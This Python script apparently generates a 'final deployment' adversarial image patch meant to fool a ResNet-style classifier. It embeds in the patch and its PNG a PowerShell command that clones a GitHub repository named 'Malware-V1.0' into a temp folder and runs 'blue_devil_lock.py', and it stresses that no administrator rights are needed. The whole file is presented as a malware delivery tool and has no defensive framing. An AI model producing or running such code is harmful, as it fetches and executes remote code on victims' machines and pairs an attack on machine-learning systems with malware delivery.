"""
Create final deployment adversarial patches with PowerShell execution.
Malware Patch: PowerShell → Download GitHub repo → Run blue_devil_lock.py
"""
import torch
import numpy as np
import cv2
from PIL import Image
import os
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).parent))

from src.patch.patch_metadata import PatchMetadata, create_patch_metadata
from src.utils.logger import setup_logger

logger = setup_logger()


def create_malware_patch_final(base_patch_path='data/patches/resnet_breaker_70pct.pt',
                              output_path='data/patches/final_deployment/malware_patch_final.pt'):
    """
    Create Malware patch with red/black angular pattern.
    When detected: PowerShell admin → Download GitHub repo → Run blue_devil_lock.py
    """
    print("="*70)
    print("CREATING MALWARE PATCH (FINAL DEPLOYMENT)")
    print("="*70)
    print("Visual: Red/black angular adversarial pattern")
    print("Action: PowerShell -> Download repo -> Run blue_devil_lock.py")
    print("-"*70)
    
    # Load base patch
    patch_data = torch.load(base_patch_path)
    if isinstance(patch_data, dict) and 'patch' in patch_data:
        base_patch = patch_data['patch']
    else:
        base_patch = patch_data
    
    if isinstance(base_patch, torch.Tensor):
        patch_np = base_patch.cpu().numpy()
    else:
        patch_np = np.array(base_patch)
    
    # Ensure correct shape (C, H, W)
    if len(patch_np.shape) == 3 and patch_np.shape[0] == 3:
        pass
    elif len(patch_np.shape) == 3:
        patch_np = np.transpose(patch_np, (2, 0, 1))
    
    C, H, W = patch_np.shape
    
    # Create red/black angular pattern overlay (adversarial)
    y_coords, x_coords = np.meshgrid(np.arange(H), np.arange(W), indexing='ij')
    
    # Diagonal stripes (red theme) - adversarial pattern
    diagonal1 = np.sin((x_coords + y_coords) / 12.0) * 0.4 + 0.3
    diagonal2 = np.sin((x_coords - y_coords) / 18.0) * 0.3 + 0.2
    diagonal3 = np.cos((x_coords * 1.5 + y_coords * 0.5) / 15.0) * 0.2 + 0.1
    
    # Create overlay: red/black pattern
    overlay = np.zeros((3, H, W))
    overlay[0] = diagonal1 + diagonal2 + diagonal3 + 0.4  # Red channel (strong)
    overlay[1] = diagonal1 * 0.08 + diagonal2 * 0.05  # Green (minimal)
    overlay[2] = diagonal2 * 0.08 + diagonal3 * 0.05  # Blue (minimal)
    
    # Add angular patterns (diamonds/squares) for adversarial effect
    center_x, center_y = W // 2, H // 2
    for size in range(30, min(H, W) // 2, 45):
        diamond = np.abs(x_coords - center_x) + np.abs(y_coords - center_y)
        diamond_mask = ((diamond < size) & (diamond > size - 8)).astype(float)
        overlay[0] = overlay[0] + diamond_mask * 0.6  # Bright red borders
        overlay[1] = overlay[1] + diamond_mask * 0.08
        overlay[2] = overlay[2] + diamond_mask * 0.08
    
    # Add grid pattern (angular) for more adversarial patterns
    grid_spacing = 22
    grid_x = (x_coords % grid_spacing < 2).astype(float) * 0.5
    grid_y = (y_coords % grid_spacing < 2).astype(float) * 0.5
    overlay[0] = overlay[0] + grid_x + grid_y
    overlay[1] = overlay[1] + (grid_x + grid_y) * 0.08
    overlay[2] = overlay[2] + (grid_x + grid_y) * 0.08
    
    # Add checkerboard pattern for additional adversarial effect
    checker = ((x_coords // 15 + y_coords // 15) % 2).astype(float) * 0.2
    overlay[0] = overlay[0] + checker
    overlay[1] = overlay[1] + checker * 0.1
    overlay[2] = overlay[2] + checker * 0.1
    
    overlay = np.clip(overlay, 0, 1)
    
    # Blend with base patch (75% overlay, 25% base)
    final_patch = overlay * 0.75 + patch_np * 0.25
    final_patch = np.clip(final_patch, 0, 1)
    
    # PowerShell command to download repo and run blue_devil_lock.py (no admin required)
    ps_command = '''
    $repoUrl = "https://github.com/ASK92/Malware-V1.0.git"
    $tempDir = "$env:TEMP\\malware_repo_$(Get-Random)"
    $scriptName = "blue_devil_lock.py"
    
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    git clone $repoUrl $tempDir
    if (Test-Path "$tempDir\\$scriptName") {
        python "$tempDir\\$scriptName"
    }
    '''
    
    # Create metadata
    metadata = create_patch_metadata(
        repo_url='https://github.com/ASK92/Malware-V1.0.git',
        target_script='blue_devil_lock.py',
        patch_type='malware',
        command_type='blue_devil_lock',
        description='Malware patch (Final Deployment) - Red/black angular pattern, PowerShell -> Download repo -> Run blue_devil_lock.py',
        version='2.0'
    )
    metadata['powershell_command'] = ps_command
    metadata['requires_admin'] = False
    metadata['execution_method'] = 'powershell'
    
    # Save
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    patch_dict = {
        'patch': torch.from_numpy(final_patch),
        'metadata': metadata
    }
    torch.save(patch_dict, output_path)
    
    # Embed metadata
    PatchMetadata.embed_metadata(output_path, metadata)
    
    print(f"[SUCCESS] Malware patch saved: {output_path}")
    print("  Visual: Red/black angular adversarial pattern")
    print("  Action: PowerShell -> Download repo -> Run blue_devil_lock.py")
    print("  Requires Admin: No")
    
    return final_patch


def create_patch_images():
    """Create PNG images of malware patch for visualization."""
    print("\n" + "="*70)
    print("CREATING PNG IMAGES")
    print("="*70)
    
    # Malware patch image
    malware_patch_path = 'data/patches/final_deployment/malware_patch_final.pt'
    if os.path.exists(malware_patch_path):
        patch_data = torch.load(malware_patch_path)
        if isinstance(patch_data, dict) and 'patch' in patch_data:
            patch = patch_data['patch']
        else:
            patch = patch_data
        
        if isinstance(patch, torch.Tensor):
            patch_np = patch.cpu().numpy()
        else:
            patch_np = np.array(patch)
        
        if len(patch_np.shape) == 3 and patch_np.shape[0] == 3:
            patch_np = np.transpose(patch_np, (1, 2, 0))
        
        if patch_np.max() <= 1.0:
            patch_np = (patch_np * 255).astype(np.uint8)
        else:
            patch_np = patch_np.astype(np.uint8)
        
        img = Image.fromarray(patch_np)
        output_img = 'data/patches/final_deployment/malware_patch_final.png'
        img.save(output_img, dpi=(300, 300))
        
        # Embed metadata in PNG
        metadata = PatchMetadata.extract_metadata(malware_patch_path)
        if metadata:
            PatchMetadata.embed_metadata(output_img, metadata)
        
        print(f"[SUCCESS] Malware patch image: {output_img}")


def main():
    """Create final deployment patches."""
    print("="*70)
    print("FINAL DEPLOYMENT PATCH GENERATOR")
    print("="*70)
    print("\nCreating adversarial patch with PowerShell execution:")
    print("\nMALWARE PATCH")
    print("   Visual: Red/black angular adversarial pattern")
    print("   Action: PowerShell -> Download GitHub repo -> Run blue_devil_lock.py")
    print("="*70)
    
    base_patch = 'data/patches/resnet_breaker_70pct.pt'
    if not os.path.exists(base_patch):
        print(f"\nERROR: Base patch not found: {base_patch}")
        print("Please ensure the base patch exists.")
        return
    
    # Create Malware patch
    print("\n")
    malware_patch = create_malware_patch_final(
        base_patch_path=base_patch,
        output_path='data/patches/final_deployment/malware_patch_final.pt'
    )
    
    # Create PNG images
    create_patch_images()
    
    print("\n" + "="*70)
    print("SUMMARY")
    print("="*70)
    print("\n[SUCCESS] Created final deployment patch:")
    print("\nMALWARE PATCH:")
    print("   - Tensor: data/patches/final_deployment/malware_patch_final.pt")
    print("   - Image:  data/patches/final_deployment/malware_patch_final.png")
    print("   - Visual: Red/black angular adversarial pattern")
    print("   - Action: PowerShell -> Download repo -> Run blue_devil_lock.py")
    print("\n" + "="*70)
    print("NOTE: Patch runs without administrator privileges.")
    print("="*70)


if __name__ == '__main__':
    main()

